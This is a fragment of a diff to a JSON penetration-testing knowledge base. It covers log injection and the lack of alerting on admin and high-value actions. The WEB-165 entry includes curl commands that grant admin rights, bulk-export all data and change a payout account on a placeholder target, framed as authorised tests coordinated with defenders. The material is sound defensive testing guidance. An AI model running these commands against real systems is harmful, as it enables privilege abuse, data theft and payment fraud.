+    "Stored XSS in a web-based log viewer, where unescaped logged input executes in an analyst's authenticated monitoring session.",
+    "Logging-library expression injection, where attacker-controlled strings reaching a logging call are interpreted rather than merely stored (the Log4Shell class)."
+   ],
+   "mitigation": [
+    "Neutralise control characters (encode or strip newlines, carriage returns, and other terminal control sequences) in any user-supplied value before it is written to a log.",
+    "Use structured logging (for example JSON with a proper encoder) so user input is stored as data in a field rather than concatenated into a free-form line.",
+    "Escape or sanitise logged content at the point it is rendered in any log-viewing UI or dashboard, treating stored log data as untrusted output.",
+    "Keep logging libraries fully patched and disable any message-interpolation or lookup features that would interpret logged strings.",
+    "Clearly separate attacker-controlled fields from server-generated fields in the log format so a forged value cannot masquerade as a trusted one.",
+    "Protect log integrity with append-only storage, forwarding to a tamper-resistant central store, and where required cryptographic signing, so forged or altered lines are detectable."
+   ],
+   "mitigationClientFacing": "Your application records some of the text that users type or send into its logs, and it does so without cleaning out special characters. This lets an attacker do three things: write fake entries into your logs to hide their tracks or blame someone else, break the automatic tools that read your logs so real warnings get missed, and — most seriously — plant a hidden trap in a log entry that runs against your own security analysts when they open the log to investigate. In one infamous industry case, sending crafted text into a logging system led all the way to attackers running code. The fix is to strip or neutralise those special characters before anything is written to a log, to store logs in a structured way that keeps user text as plain data, and to make sure any screen that displays logs treats their content as untrusted. This protects the integrity of your records and the safety of the people who rely on them.",
+   "reference": {
+    "standard": "A09:2025 - Security Logging and Alerting Failures",
+    "cwe": "CWE-117",
+    "tools": [
+     "Burp Suite Professional",
+     "curl",
+     "grep",
+     "interactsh-client"
+    ],
+    "links": [
+     "OWASP Top 10 2025 - A09 Security Logging and Alerting Failures",
+     "CWE-117 (Improper Output Neutralization for Logs)",
+     "OWASP Log Injection article",
+     "MITRE ATT&CK T1070 (Indicator Removal)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A09",
+   "categoryName": "Security Logging and Alerting Failures",
+   "attack": [
+    {
+     "id": "T1685.002",
+     "name": "Disable or Modify Cloud Log",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-INPV",
+     "name": "Input Validation"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V16",
+     "name": "Security Logging and Error Handling"
+    }
+   ]
+  },
+  {
+   "id": "WEB-165",
+   "domain": "WEB",
+   "title": "No Monitoring or Alerting on High-Value Transactions and Admin Actions",
+   "sequence": 622,
+   "severity": "medium",
+   "severityLabel": "Medium",
+   "cwe": "CWE-778",
+   "prerequisites": "Test accounts including, ideally, an administrative or privileged test account, and coordination with the client's operations or blue team to observe what is logged and alerted during the test. An intercepting proxy to perform controlled sensitive actions. Authorization to execute a bounded set of high-value operations (privilege changes, large or unusual transactions, configuration changes, data exports) in a test context and to review the resulting monitoring behaviour.",
+   "whatItIs": "Beyond logins, applications perform actions where a single event can be catastrophic: changing another user's role to admin, exporting a whole dataset, altering payment or payout details, disabling security controls, or moving large sums. These high-value actions should always be recorded and, for the riskiest of them, should raise an alert a human sees. This test checks whether privileged and high-value operations are monitored and alerted, or whether an attacker who reaches them can act freely and invisibly.",
+   "rootCause": "Monitoring effort concentrates on the perimeter and on login, while the sensitive business actions that follow are assumed to be safe because they require privilege. But privilege can be obtained through account takeover, insider access, or an access-control flaw, and once inside, the attacker's most damaging steps are precisely these high-value actions. Without event recording and alerting on them, there is no detection layer behind the access control, so a single failure of that control leads directly to undetected abuse.",
+   "impact": "An attacker who gains privileged access — or a malicious insider — can grant themselves persistent administrative rights, exfiltrate entire datasets, redirect payments, and disable defences, with none of it raising an alarm or leaving a usable trail. The organisation loses both the chance to interrupt the abuse in progress and the ability to reconstruct what happened afterward. Fraud, mass data theft, and privilege abuse can therefore run to completion and be discovered only through external consequences (a customer report, a regulator, or a public leak) long after the fact.",
+   "realWorldContext": "Insider-abuse and account-takeover incidents repeatedly show the same shape: the damaging action was a legitimate-looking privileged operation that no one was watching, so it was discovered late and reconstructed with difficulty. The 2019 Capital One breach is a useful illustration of the broader lesson — a foothold led to a large data export, and the value of detecting anomalous high-value activity (mass reads and exports) is precisely what stands between a foothold and a headline breach. Fraud teams learn the same lesson from payout and role-change abuse. In engagements, testers perform authorised privileged actions and then ask the blue team what alerted; silence on admin actions and high-value transactions is a serious detection gap even when the access controls themselves held.",
+   "difficulty": "Intermediate",
+   "timeEstimate": "1-2 hours",
+   "stepsToIdentify": [
+    "With the client, enumerate the application's high-value actions: privilege/role changes, user creation, data export or bulk read, payment or payout changes, security-setting changes, and large or unusual transactions.",
+    "Coordinate a test window in which log and alert output can be observed by the defensive team.",
+    "Using an authorised privileged test account, perform each high-value action once and check whether it is recorded with actor, target, timestamp, and before/after state.",
+    "Check whether the riskiest actions (granting admin, disabling MFA/logging, bulk export) generate a distinct alert to a monitored destination, not merely a log line.",
+    "Model an anomalous pattern (for example an unusually large export or a rapid series of role changes) and check whether any anomaly or threshold alert fires.",
+    "Record which high-value actions are unlogged, logged without sufficient detail, or logged but never alerted."
+   ],
+   "exploitationSteps": [
+    "Confirm authorization and the exact set and volume of high-value actions to perform, using test data and test accounts so no real customer records or funds are affected.",
+    "Perform a privilege-escalation action (for example elevating a test user to admin) and, with the blue team, determine whether it was logged and whether it alerted.",
+    "Perform a bulk data-export or bulk-read action at a scale flagged as anomalous and check for any volume-based alert.",
+    "Perform a sensitive configuration or payout-detail change and check whether the before/after values were captured and whether a change alert fired.",
+    "Capture the detection gaps as evidence (empty dashboards, absent alerts) rather than by causing real impact, and confirm the actions were reversed in the test environment.",
+    "Document each high-value action's monitoring status and map every gap to a specific detection or alert the client should implement."
+   ],
+   "examplePayloads": [
+    {
+     "label": "Perform a role-elevation action on a test user (authorized)",
+     "command": "curl -s -X POST https://<target>/api/v1/admin/users/<test-user-id>/role -b admin-cookies.txt -H 'Content-Type: application/json' -d '{\"role\":\"admin\"}'"
+    },
+    {
+     "label": "Trigger a bulk export sized to look anomalous",
+     "command": "curl -s https://<target>/api/v1/admin/export?scope=all&format=csv -b admin-cookies.txt -o export-poc.csv -w 'bytes:%{size_download}\\n'"
+    },
+    {
+     "label": "Change a sensitive payout/config value (before/after capture)",
+     "command": "curl -s -X PUT https://<target>/api/v1/settings/payout-account -b admin-cookies.txt -H 'Content-Type: application/json' -d '{\"account\":\"POC-TEST-ACCT-0001\"}'"
+    },
+    {
+     "label": "Rapid series of role changes to model an anomaly",
+     "command": "for id in <test-id-1> <test-id-2> <test-id-3>; do curl -s -X POST https://<target>/api/v1/admin/users/$id/role -b admin-cookies.txt -d '{\"role\":\"admin\"}' -H 'Content-Type: application/json'; done"
+    },
+    {
+     "label": "Blue-team side: query for high-value action events",
+     "command": "# search audit where action in (role_change, bulk_export, payout_change, mfa_disable) | table _time, actor, target, before, after"
+    }
+   ],
+   "variants": [
+    "Privilege-change actions (granting admin, adding users to sensitive groups) that are unlogged or un-alerted.",
+    "Bulk data reads/exports with no volume-based anomaly detection, allowing mass exfiltration to pass unnoticed.",
+    "Payment, payout, or banking-detail changes that are not distinctly alerted, enabling quiet financial fraud.",
+    "Security-control changes (disabling MFA, turning off logging, altering access policies) that produce no alert, letting an attacker blind the defences before acting."
+   ],
+   "mitigation": [
+    "Define an explicit inventory of high-value and privileged actions and require that each one emits a structured audit event with actor, target, timestamp, and before/after state.",
+    "Configure distinct, high-priority alerts for the riskiest actions (admin grants, MFA/logging changes, bulk exports, payout changes) routed to a monitored on-call destination.",
+    "Implement anomaly and threshold detection on transaction volume and rate so unusually large or rapid high-value activity is flagged automatically.",
+    "Forward these audit events to a tamper-resistant central store separate from the accounts that can perform the actions, preserving integrity.",
+    "Consider step-up verification or out-of-band confirmation for the most sensitive actions, so detection is paired with a control that can interrupt abuse.",
+    "Regularly exercise these detections with authorised test actions (purple-team drills) to confirm the alerts fire, reach a responder, and contain enough detail to act on."
+   ],
+   "mitigationClientFacing": "Some of the actions in your application are the ones that really matter — making someone an administrator, exporting large amounts of data, changing where money is sent, or switching off security features. We found that when these high-impact actions happen, they are not always recorded in useful detail and, more importantly, they do not raise an alarm that a person would see. Your access controls decide who is allowed to do these things, but if those controls are ever bypassed — through a stolen account, an insider, or a flaw — there is nothing watching behind them, so the most damaging steps could be taken silently and discovered only much later. The fix is to keep a clear record of every high-value action and to raise real-time alerts on the riskiest ones, so that even if someone gets through, their most dangerous moves are seen and can be stopped or investigated quickly.",
+   "reference": {
+    "standard": "A09:2025 - Security Logging and Alerting Failures",
+    "cwe": "CWE-778",
+    "tools": [
+     "Burp Suite Professional",
+     "curl",
+     "SIEM / audit query console (Splunk, Elastic)",
+     "Custom monitoring / anomaly-detection rules"
+    ],
+    "links": [
+     "OWASP Top 10 2025 - A09 Security Logging and Alerting Failures",
+     "CWE-778 (Insufficient Logging)",
+     "CWE-223 (Omission of Security-relevant Information)",
+     "MITRE ATT&CK T1078 (Valid Accounts)"
+    ]
+   },
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A09",
+   "categoryName": "Security Logging and Alerting Failures",
+   "attack": [
+    {
+     "id": "T1685.002",
+     "name": "Disable or Modify Cloud Log",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-ATHZ",
+     "name": "Authorization"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V16",
+     "name": "Security Logging and Error Handling"
+    }
+   ]
   }
  ]
 }
